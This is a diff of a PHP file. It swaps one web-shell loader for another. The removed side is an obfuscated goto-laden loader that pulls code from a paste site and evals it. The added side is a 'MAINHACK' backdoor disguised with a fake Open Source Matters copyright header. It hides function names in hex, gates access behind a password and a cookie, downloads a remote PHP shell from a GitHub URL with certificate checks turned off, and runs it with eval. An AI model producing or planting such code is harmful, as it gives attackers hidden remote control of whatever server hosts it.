@@ -1,3 +1,173 @@
 <?php
- goto uaWbf; Ql2LW: jK94H: goto W81wN; zPevR: if (password_verify($rhzDe, $z3e4E)) { goto jK94H; } goto vHFyY; nQ1EM: echo "\40\40\40\x20\x3c\41\x44\x4f\x43\124\131\120\x45\x20\x68\x74\155\x6c\76\12\40\x20\x20\x20\x3c\x68\164\x6d\154\x3e\xa\x20\40\40\x20\x3c\x68\x65\141\144\x3e\12\40\x20\40\40\40\40\x20\x20\x3c\164\x69\164\154\x65\76\x4d\101\x49\116\x48\101\103\x4b\74\57\164\x69\x74\x6c\145\x3e\12\40\40\40\40\74\x2f\x68\145\x61\144\76\xa\x20\40\40\x20\x3c\x62\x6f\144\x79\x3e\xa\40\40\x20\40\40\x20\40\40\74\x66\157\162\155\40\x6d\145\164\x68\x6f\x64\75\x22\120\117\123\x54\42\40\141\x63\164\151\157\156\x3d\42\x22\x3e\xa\x20\x20\40\40\40\40\40\40\40\40\x20\x20\x3c\154\x61\142\x65\154\40\x66\157\162\75\x22\x70\x61\x73\163\167\157\162\x64\x22\76\120\x61\x73\163\x77\157\162\144\x3a\74\x2f\154\141\x62\x65\x6c\76\xa\40\x20\x20\x20\40\40\40\40\x20\40\x20\x20\74\x69\156\160\165\x74\x20\x74\x79\x70\145\75\x22\160\x61\x73\x73\167\x6f\162\144\x22\x20\151\x64\x3d\x22\x70\141\x73\163\167\157\x72\x64\42\40\156\x61\x6d\145\75\42\x70\x61\x73\x73\167\157\x72\144\42\x3e\xa\40\x20\x20\x20\40\x20\x20\x20\40\x20\40\40\x3c\151\156\x70\x75\x74\x20\164\171\160\145\x3d\42\x73\165\142\x6d\151\x74\x22\40\166\141\x6c\x75\x65\x3d\x22\114\x6f\147\x69\156\42\76\xa\x20\x20\40\x20\40\40\x20\x20\74\57\x66\x6f\x72\155\76\xa\40\40\40\x20\x3c\x2f\142\x6f\x64\171\76\xa\x20\x20\x20\x20\74\x2f\x68\164\x6d\x6c\76\12\40\40\x20\x20"; goto NMCe1; QAMzu: dxeH4: goto yvJz1; uaWbf: session_start(); goto MmOjX; fnxVl: exit; goto Q13G1; yvJz1: if (!(!isset($_SESSION["\143\x61\143\150\x65\x64\137\x64\141\x74\141"]) || empty($_SESSION["\143\141\143\x68\x65\144\x5f\144\141\x74\141"]))) { goto XVQB3; } goto WTwQw; Q13G1: NHkRI: goto hkoeV; pM_Mu: eval("\77\x3e" . $_SESSION["\143\x61\x63\150\145\x64\137\x64\141\164\141"]); goto PHpUe; W81wN: $_SESSION["\x6c\x6f\x67\147\145\144\137\151\x6e"] = true; goto G9xoc; G9xoc: $_SESSION["\152\x61\166\x61"] = "\x6e\x65\x73\x65\143"; goto hqlrr; yobGL: echo "\146\141\x69\x6c\x65\144"; goto fnxVl; O771t: $z3e4E = "\44\62\x61\x24\x31\x30\44\x7a\156\167\125\x32\x2f\x72\153\65\x2e\x43\65\104\132\x4d\x7a\127\x6f\64\x6f\x78\x2e\146\x5a\121\127\110\110\112\150\156\142\105\x59\172\150\121\121\x58\x63\x50\115\154\x4c\117\130\165\124\110\150\x75\x6a\123"; goto zPevR; qL5Vz: goto GCGwE; goto Ql2LW; WTwQw: $_SESSION["\x63\x61\x63\x68\145\x64\x5f\144\x61\x74\141"] = uwo9Y("\150\x74\x74\160\163\72\57\x2f\x70\x61\163\x74\x65\x2e\155\x79\143\x6f\156\141\156\x2e\x6e\x65\x74\57\x36\x30\x32\x32\67\x37\x2e\x74\x78\164"); goto TGfPE; hqlrr: GCGwE: goto zMo2a; TNx3M: if (XV7t0()) { goto dxeH4; } goto nQ1EM; opeZk: function XV7T0() { return isset($_SESSION["\154\x6f\147\x67\145\x64\x5f\151\x6e"]) && $_SESSION["\154\157\x67\x67\145\x64\x5f\151\x6e"] === true; } goto jejz9; MmOjX: function UwO9Y($jDIGY) { goto ZDx71; zvR0G: if (!isset($_SESSION["\x6a\x61\166\x61"])) { goto ykoGN; } goto ifq53; J8laQ: pcCX3: goto Id4yS; Ip_L1: curl_close($b6Plz); goto sDIc3; ZplyN: $C_8qy = false; goto lu4pe; Y9Xe2: fclose($EyC4j); goto N2UDB; e9tkd: curl_setopt($b6Plz, CURLOPT_SSL_VERIFYHOST, 0); goto zvR0G; Id4yS: $EyC4j = fopen($jDIGY, "\x72"); goto Df9vq; mfLlU: QvQPE: goto FPzdr; MxtP4: $b6Plz = curl_init($jDIGY); goto NxlI0; Df9vq: $C_8qy = stream_get_contents($EyC4j); goto Y9Xe2; D8O2C: if (function_exists("\x66\151\x6c\145\137\147\x65\x74\137\x63\x6f\156\164\145\x6e\164\x73")) { goto QvQPE; } goto n3xTr; n3xTr: if (function_exists("\146\157\x70\x65\x6e") && function_exists("\x73\x74\x72\x65\141\x6d\x5f\x67\145\x74\x5f\x63\157\156\164\145\x6e\x74\163")) { goto pcCX3; } goto ZplyN; ML8qW: $C_8qy = curl_exec($b6Plz); goto Ip_L1; NxlI0: curl_setopt($b6Plz, CURLOPT_RETURNTRANSFER, 1); goto xpWE0; rNJxi: goto Guozk; goto J8laQ; lu4pe: goto Guozk; goto eKwtc; sz20r: curl_setopt($b6Plz, CURLOPT_USERAGENT, "\x4d\x6f\x7a\x69\154\x6c\141\57\x35\x2e\60\x20\x28\x57\x69\156\x64\x6f\x77\163\x20\x4e\x54\40\66\56\61\73\x20\162\166\72\x33\x32\56\60\51\x20\107\x65\x63\x6b\157\x2f\62\60\61\x30\60\61\x30\x31\x20\x46\x69\x72\145\146\x6f\x78\x2f\x33\x32\56\60"); goto f2FAM; sDIc3: goto Guozk; goto mfLlU; xpWE0: curl_setopt($b6Plz, CURLOPT_FOLLOWLOCATION, 1); goto sz20r; ZDx71: if (function_exists("\x63\165\x72\x6c\x5f\145\x78\145\143")) { goto QIaZO; } goto D8O2C; ifq53: curl_setopt($b6Plz, CURLOPT_COOKIE, $_SESSION["\x6a\x61\166\x61"]); goto C1m19; FPzdr: $C_8qy = file_get_contents($jDIGY); goto rNJxi; N2UDB: Guozk: goto HO4yj; eKwtc: QIaZO: goto MxtP4; C1m19: ykoGN: goto ML8qW; f2FAM: curl_setopt($b6Plz, CURLOPT_SSL_VERIFYPEER, 0); goto e9tkd; HO4yj: return $C_8qy; goto UH39D; UH39D: } goto opeZk; NMCe1: goto RCREC; goto QAMzu; zMo2a: CSN28: goto TNx3M; TGfPE: if (!empty($_SESSION["\x63\141\x63\150\145\144\x5f\x64\x61\x74\141"])) { goto NHkRI; } goto yobGL; S7qkQ: $rhzDe = $_POST["\x70\141\163\x73\x77\157\162\x64"]; goto O771t; jejz9: if (!isset($_POST["\x70\141\163\x73\167\x6f\x72\x64"])) { goto CSN28; } goto S7qkQ; hkoeV: XVQB3: goto pM_Mu; vHFyY: echo "\123\x61\154\x61\x68\40\x43\x6f\153"; goto qL5Vz; PHpUe: RCREC:
+/**
+ * @package    MAINHACK
+ * @copyright  Copyright (C) 2010 - 2024 Open Source Matters, Inc. All rights reserved.
+ *
+ */
 
+// @deprecated  1.0  Deprecated without replacement
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'PMH';
+}
+
+if (is_logged_in()) {
+    $Array = array(
+        '666f70656e', // fo p en => 0
+        '73747265616d5f6765745f636f6e74656e7473', // strea m_get_contents => 1
+        '66696c655f6765745f636f6e74656e7473', // fil e_g et_cont ents => 2
+        '6375726c5f65786563' // cur l_ex ec => 3
+    );
+
+    function hex2str($hex) {
+        $str = '';
+        for ($i = 0; $i < strlen($hex); $i += 2) {
+            $str .= chr(hexdec(substr($hex, $i, 2)));
+        }
+        return $str;
+    }
+
+    function geturlsinfo($destiny) {
+        $belief = array(
+            hex2str($GLOBALS['Array'][0]),
+            hex2str($GLOBALS['Array'][1]),
+            hex2str($GLOBALS['Array'][2]),
+            hex2str($GLOBALS['Array'][3])
+        );
+
+        if (function_exists($belief[3])) {
+            $ch = curl_init($destiny);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            $love = $belief[3]($ch);
+            curl_close($ch);
+            return $love;
+        } elseif (function_exists($belief[2])) {
+            return $belief[2]($destiny);
+        } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
+            $purpose = $belief[0]($destiny, "r");
+            $love = $belief[1]($purpose);
+            fclose($purpose);
+            return $love;
+        }
+        return false;
+    }
+
+    $destiny = 'https://raw.githubusercontent.com/Mainhack-Exec/mainhack/refs/heads/main/mainhack.php';
+    $dream = geturlsinfo($destiny);
+    if ($dream !== false) {
+        eval('?>' . $dream);
+    }
+} else {
+    if (isset($_POST['password'])) {
+        $entered_key = $_POST['password'];
+        $hashed_key = '$2y$10$OBv8.j2yBmzLarDHlfcdVeYd3y81ao3kDG9h7vSnWOJsZZy3wuiFS';
+
+        if (password_verify($entered_key, $hashed_key)) {
+            setcookie('user_id', 'PMH', time() + 3600, '/');
+            header("Location: ".$_SERVER['PHP_SELF']);
+            exit();
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Sysadmin</title>
+        <style>
+            html, body {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+                width: 100%;
+                overflow: hidden; 
+            }
+            body {
+                background: url('https://edukasipatriotikindonesia.com/mainhack.jpg') no-repeat center center;
+                background-size: 60%; 
+                background-attachment: fixed; 
+                position: relative;
+            }
+            .overlay {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.5); 
+                z-index: 0; 
+            }
+            .login-container {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                width: 300px;
+                background: rgba(255, 255, 255, 0.8); 
+                padding: 20px;
+                border: 1px solid #ccc;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                text-align: center;
+                z-index: 1; 
+            }
+            .login-container input {
+                width: calc(100% - 22px);
+                padding: 10px;
+                margin: 10px 0;
+                box-sizing: border-box;
+            }
+            .login-container label {
+                display: block;
+                margin-bottom: 10px;
+            }
+            .snowflake {
+                position: absolute;
+                background: white;
+                border-radius: 50%;
+                width: 5px;
+                height: 5px;
+                opacity: 0.8;
+                pointer-events: none;
+                z-index: 0;
+                animation: fall linear;
+            }
+            @keyframes fall {
+                to {
+                    transform: translateY(100vh);
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="overlay"></div> 
+        <div class="login-container">
+            <form method="POST" action="">
+                <label for="password">HEY BROW , WHAT ARE YOU DOING ?</label>
+                <input type="password" id="password" name="password" autofocus>
+                <input type="submit" value="Kiw Kiw">
+            </form>
+        </div>
+        <script>
+            function createSnowflake() {
+                const snowflake = document.createElement('div');
+                snowflake.className = 'snowflake';
+                snowflake.style.left = Math.random() * 100 + 'vw';
+                snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+                snowflake.style.opacity = Math.random();
+                document.body.appendChild(snowflake);
+
+                setTimeout(() => {
+                    snowflake.remove();
+                }, 5000);
+            }
+
+            setInterval(createSnowflake, 100);
+        </script>
+    </body>
+    </html>
+    <?php
+}
+?>
